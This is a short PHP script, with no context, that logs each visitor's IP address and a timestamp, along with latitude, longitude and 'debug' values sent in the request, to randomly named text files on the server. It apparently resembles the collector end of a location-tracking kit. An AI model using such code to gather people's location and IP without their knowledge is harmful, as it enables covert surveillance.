<?php
$IP = $_SERVER['REMOTE_ADDR'];
$date_time = date("l j F Y  g:ia", time() - date("Z")) ;
//echo "$date_time   IP: $IP";

$myfile = fopen(mt_rand().".txt", "w") or die("Unable to open file!");
$txt = "Latitude :-".$_REQUEST['Latitude']."  ";
fwrite($myfile, $txt);
$txt = "   ";
fwrite($myfile, $txt);
$txt = "Longitude :-".$_REQUEST['Longitude']."   "; 
fwrite($myfile, $txt);
$txt = "   ";
fwrite($myfile, $txt);
$txt = "IP Address :-"."$date_time   IP: $IP";
fwrite($myfile, $txt);
$txt = "   ";
fwrite($myfile, $txt);
$txt = "Data :-".$_REQUEST['debug']." ";
fwrite($myfile, $txt);
fclose($myfile);
?>